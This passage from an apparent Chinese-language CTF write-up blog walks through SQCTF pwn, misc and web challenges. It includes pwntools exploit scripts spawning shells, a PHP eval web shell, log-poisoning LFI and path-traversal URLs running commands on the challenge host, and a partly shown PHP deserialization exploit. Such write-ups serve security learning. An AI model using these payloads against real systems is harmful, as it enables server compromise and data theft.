p64(canary)</span><br><span class="line">payload += p64(libc_base + <span class="number">0x220000</span>)</span><br><span class="line">payload += p64(onegadget_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="萧萧黄叶闭疏窗"><a href="#萧萧黄叶闭疏窗" class="headerlink" title="萧萧黄叶闭疏窗"></a>萧萧黄叶闭疏窗</h3><p>ret2shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(<span class="string">&#x27;./bad&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">31569</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bad&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;A&quot;</span> * <span class="number">64</span>         <span class="comment"># 填满 dest</span></span><br><span class="line">padding += <span class="string">b&quot;B&quot;</span> * <span class="number">8</span>         <span class="comment"># 覆盖 saved rbp</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="number">0x4040A0</span></span><br><span class="line">payload = padding + p64(shellcode_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 shellcode 填在开头</span></span><br><span class="line">final_payload = shellcode.ljust(<span class="number">0x40</span>, <span class="string">b&quot;\x90&quot;</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4040A0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互发送</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;What do you want to do ?&quot;</span>)</span><br><span class="line">io.send(final_payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="借的东风破金锁"><a href="#借的东风破金锁" class="headerlink" title="借的东风破金锁"></a>借的东风破金锁</h3><p>没感受到溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(<span class="string">&#x27;./key&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">31073</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x46\x54\x43\x55\x4E\x51\x53\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Input your key: &quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="花非花，雾非雾-1-没出"><a href="#花非花，雾非雾-1-没出" class="headerlink" title="花非花，雾非雾_1 [没出]"></a>花非花，雾非雾_1 [没出]</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250412141540987.png" alt="image-20250412141540987"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">50</span> 4B 03 04 <span class="number">14</span> <span class="number">00</span> 08 <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>zip,发现一个docx</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250412121106563.png" alt="image-20250412121106563"></p>
<p>爆破</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250412142232031.png" alt="image-20250412142232031"></p>
<p>发现一个fakeflag</p>
<p>there is nothing for haha</p>
<p>…</p>
<p>其实是逆向</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 拼接目标字节序列（小端序）</span></span><br><span class="line">    v5 = <span class="number">0xFCA5C8F9DC9DC3DE</span></span><br><span class="line">    v6 = <span class="number">0xD8F5A4D4</span></span><br><span class="line">    v7 = <span class="number">0xA501</span></span><br><span class="line"></span><br><span class="line">    target = v5.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>) + v6.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) + v7.to_bytes(<span class="number">2</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">        <span class="comment"># 反推公式：(s[i] ^ 0xAA) + i == target[i]</span></span><br><span class="line">        val = (target[i] - i) &amp; <span class="number">0xFF</span>  <span class="comment"># 保证字节合法</span></span><br><span class="line">        c = val ^ <span class="number">0xAA</span></span><br><span class="line">        result += <span class="built_in">chr</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Recovered Key:&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>th1s_i5_f1Ag_2</p>
<p>nc即可</p>
<p>base91解出来</p>
<p>F9KBbQmplPrIhMHRb9LBfMro+</p>
<p>再xxdecode</p>
<p>-eadbee-fcdmk-cgs-qou-a7g-skc}</p>
<p>中间搞了4h</p>
<p>d29_qaXVza_GlndXlpZ_Xhpbm5p_ZGVoYWh_haGE</p>
<p>这个东西是王者荣耀的flag不一定是flag跟之前相对应</p>
<p>后来又卡了一会</p>
<p>发现好像是base64解码后</p>
<p>d29qaXVzaGlndXlpZXhpbm5pZGVoYWhhaGE</p>
<p>就是wojiushiguyifxinnidehahaha</p>
<p>解压还是不对</p>
<p>语义不通把f改成e，解压出了</p>
<p>wojiushiguyiexinnidehahaha</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UEsDBBQAAAAAAG6tiFon6sTpEQAAABEAAAArAAAA2sDRvaOszfXV38jZ0qvKx8rAvefJz9fuusPN5rXE087Pty9mbGFnLnR4dHNxY3Rme2xhaWNhaS1kZWFkUEsBAhQAFAAAAAAAbq2IWifqxOkRAAAAEQAAACsAAAAAAAAAAQAgAAAAAAAAANrA0b2jrM311d/I2dKrysfKwL3nyc/X7rrDzea1xNPOz7cvZmxhZy50eHRQSwUGAAAAAAEAAQBZAAAAWgAAAAAA</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PKn­Z&#x27;êÄé+ÚÀÑ½£¬ÍõÕßÈÙÒ«ÊÇÊÀ½çÉÏ×îºÃÍæµÄÓÎÏ·/flag.txtsqctf&#123;laicai-deadPKn­Z&#x27;êÄé+ ÚÀÑ½£¬ÍõÕßÈÙÒ«ÊÇÊÀ½çÉÏ×îºÃÍæµÄÓÎÏ·/flag.txtPKYZ</span><br></pre></td></tr></table></figure>

<p>sqctf{laicai-dead-eadbee-fcdmk-cgs-qou-a7g-skc}</p>
<p>sqctf{laicai-dead-cdmk-}</p>
<p>cgsqoua7gskc</p>
<p>sqctf{laicai-deadbee-fcdmk-cgs-qou-a7g-skc}</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="商师一日游"><a href="#商师一日游" class="headerlink" title="商师一日游"></a>商师一日游</h3><p>忘记写wp了，关卡类的，看看cookie，hackerbar即可</p>
<h3 id="ezGame"><a href="#ezGame" class="headerlink" title="ezGame"></a>ezGame</h3><p>2048玩够分数即可</p>
<h3 id="My-Blog"><a href="#My-Blog" class="headerlink" title="My Blog"></a>My Blog</h3><p>源码发现</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250407200520610.png" alt="image-20250407200520610"></p>
<p>直接robots.txt发现login.php登录得flag</p>
<h3 id="Upload-Level1"><a href="#Upload-Level1" class="headerlink" title="Upload_Level1"></a>Upload_Level1</h3><p>蚁剑链接，上传b.jpg改php，传一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250407201455988.png" alt="image-20250407201455988"></p>
<h3 id="baby-include"><a href="#baby-include" class="headerlink" title="baby include"></a>baby include</h3><p>日志+UA注入，因为路径穿越不知道为什么一直没找到flag…..</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:31821/?look=../../../../../../../var/log/nginx/access.log&amp;cmd=tac ./flag.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250407210126875.png" alt="image-20250407210126875"></p>
<p> sqctf{–&gt;48f53834a9af4c1f9fd2aa1a5fa88446}</p>
<p>3834a9af4c1f9fd2aa1a5fa88446}</p>
<p>改cookie为strong</p>
<p>查看各种信息，多行匹配</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:31694/atc5uupl.php?hhh=abc%0Aphp%0Axyz</span><br></pre></td></tr></table></figure>

<p>最后直接蚁剑链接即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250407212703562.png" alt="image-20250407212703562"></p>
<h3 id="Through"><a href="#Through" class="headerlink" title="Through"></a>Through</h3><p>以为在flag.php里，找半天在flag里，过滤了..&#x2F;用…&#x2F;.绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408152931728.png" alt="image-20250408152931728"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..././..././flag.php</span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408210329736.png" alt="image-20250408210329736"></p>
<h3 id="File-download"><a href="#File-download" class="headerlink" title="File_download"></a>File_download</h3><p>根据提示Downservlet查看了index.jsp发现登录没用，穿越路径也不行</p>
<p>然后想到是个java后端，查看了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/DownloadServlet?filename=WEB-INF/web.xml</span><br></pre></td></tr></table></figure>

<p>找到了FlagManager，想着去访问</p>
<p>然后访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:30382/DownloadServlet?filename=WEB-INF/classes/com/ctf/flag/FlagManager.class</span><br></pre></td></tr></table></figure>

<p>显示请下载</p>
<p>再回到初始页面看了下，发现隐藏表单，去掉none之后，改get为post，就能下载了</p>
<p>提交路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF/classes/com/ctf/flag/FlagManager.class</span><br></pre></td></tr></table></figure>

<p>下载后在线反编译</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408170122892.png" alt="image-20250408170122892"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">package</span> com.ctf.flag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagManager</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">      System.out.println(<span class="string">&quot;Please input your flag: &quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> sc.next();</span><br><span class="line">      System.out.println(<span class="string">&quot;Your input is: &quot;</span>);</span><br><span class="line">      System.out.println(str);</span><br><span class="line">      <span class="type">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">      Encrypt(stringArr);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">char</span>[] arr)</span> &#123;</span><br><span class="line">      ArrayList&lt;Integer&gt; Resultlist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> arr[i] + <span class="number">38</span> ^ <span class="number">48</span>;</span><br><span class="line">         Resultlist.add(result);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span>[] key = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">110</span>, <span class="number">107</span>, <span class="number">185</span>, <span class="number">183</span>, <span class="number">183</span>, <span class="number">186</span>, <span class="number">103</span>, <span class="number">185</span>, <span class="number">99</span>, <span class="number">105</span>, <span class="number">105</span>, <span class="number">187</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">185</span>, <span class="number">103</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">187</span>, <span class="number">99</span>, <span class="number">183</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">184</span>, <span class="number">102</span>, <span class="number">106</span>, <span class="number">106</span>, <span class="number">188</span>, <span class="number">109</span>, <span class="number">186</span>, <span class="number">111</span>, <span class="number">188</span>&#125;;</span><br><span class="line">      ArrayList&lt;Integer&gt; Keylist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; key.length; ++j) &#123;</span><br><span class="line">         Keylist.add(key[j]);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">&quot;Result: &quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (Resultlist.equals(Keylist)) &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Congratulations! &quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Error! &quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>写出解密代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">110</span>, <span class="number">107</span>, <span class="number">185</span>, <span class="number">183</span>, <span class="number">183</span>, <span class="number">186</span>, <span class="number">103</span>, <span class="number">185</span>, <span class="number">99</span>, <span class="number">105</span>, <span class="number">105</span>, <span class="number">187</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">185</span>, <span class="number">103</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">187</span>, <span class="number">99</span>, <span class="number">183</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">184</span>, <span class="number">102</span>, <span class="number">106</span>, <span class="number">106</span>, <span class="number">188</span>, <span class="number">109</span>, <span class="number">186</span>, <span class="number">111</span>, <span class="number">188</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((enc[i] ^ <span class="number">48</span>) - <span class="number">38</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>85caad1c-33e3-0bc1-6d5e-a73b044f7d9f</p>
<h3 id="唯一"><a href="#唯一" class="headerlink" title="唯一"></a>唯一</h3><p>手搓半天最后有个过不了，只好一把梭了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408223710507.png" alt="image-20250408223710507"></p>
<h3 id="eeaassyy"><a href="#eeaassyy" class="headerlink" title="eeaassyy"></a>eeaassyy</h3><p>发现了第二页</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408223930101.png" alt="image-20250408223930101"></p>
<h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408231253994.png" alt="image-20250408231253994"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250408231231154.png" alt="image-20250408231231154"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动实现PHP的serialize函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">php_serialize</span>(<span class="params">obj</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;s:<span class="subst">&#123;<span class="built_in">len</span>(obj)&#125;</span>:&quot;<span class="subst">&#123;obj&#125;</span>&quot;;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">bool</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;b:<span class="subst">&#123;<span class="built_in">int</span>(obj)&#125;</span>;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;i:<span class="subst">&#123;obj&#125;</span>;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">list</span>):</span><br><span class="line">        out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(obj):</span><br><span class="line">            out += php_serialize(i) + php_serialize(val)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;a:<span class="subst">&#123;<span class="built_in">len</span>(obj)&#125;</span>:&#123;&#123;<span class="subst">&#123;out&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>):</span><br><span class="line">        out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> key, val <span class="keyword">in</span> obj.items():</span><br><span class="line">            out += php_serialize(key) + php_serialize(val)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;a:<span class="subst">&#123;<span class="built_in">len</span>(obj)&#125;</span>:&#123;&#123;<span class="subst">&#123;out&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(obj, PhpObject):</span><br><span class="line">        props = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> obj.properties.items():</span><br><span class="line">            props += php_serialize(k) + php_serialize(v)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;O:<span class="subst">&#123;<span class="built_in">len</span>(obj.classname)&#125;</span>:&quot;<span class="subst">&#123;obj.classname&#125;</span>&quot;:<span class="subst">&#123;<span class="built_in">len</span>(obj.properties)&#125;</span>:&#123;&#123;<span class="subst">&#123;props&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Unsupported type&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PhpObject</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, classname, properties</span>):</span><br><span class="line">        <span class="variable language_">self</span>.classname = classname</span><br><span class="line">        <span class="variable language_">self</span>.properties = properties</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.qsnctf.com:32431/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1 - 写 flag.php 的内容进 a.txt</span></span><br><span class="line">yyy_obj = PhpObject(<span class="string">&quot;yyy&quot;</span>, &#123;</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;flag.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;allowed&quot;</span>: <span class="literal">True</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">xxx_obj = PhpObject(<span class="string">&quot;xxx&quot;</span>, &#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: yyy_obj</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">hhh_obj = PhpObject(<span class="string">&quot;hhh&quot;</span>, &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: <span class="string">&quot;a.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;content&quot;</span>: xxx_obj</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">payload1 = php_serialize(hhh_obj)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Payload 1:&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">resp1 = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>: payload1&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Step 1 Response:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp1.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2 - 触发 flag 读取</span></span><br><span class="line">hhh_obj2 = PhpObject(<span class="string">&quot;hhh&quot;</span>, &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: <span class="string">&quot;a.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;content&quot;</span>: <span class="string">&quot;GET_FLAG&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">payload2 = php_serialize(hhh_obj2)</span><br><span class="line"><span class="built_in">print</span>(<span 